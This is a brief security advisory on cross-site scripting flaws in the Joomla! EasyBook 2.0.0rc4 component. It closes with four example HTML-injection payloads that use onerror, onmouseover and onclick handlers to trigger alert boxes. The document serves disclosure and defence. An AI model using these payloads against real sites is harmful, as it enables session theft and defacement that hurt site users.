Joomla! EasyBook component is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

EasyBook 2.0.0rc4 is vulnerable; other versions may also be affected.


The following example input is available:

[img]fake.png" onerror="alert(String.fromCharCode(88,83,83))[/img]
foo.com" onmouseover="alert(String.fromCharCode(88,83,83));return false;
' onclick="alert('XSS')"
" onclick="alert('xss')"
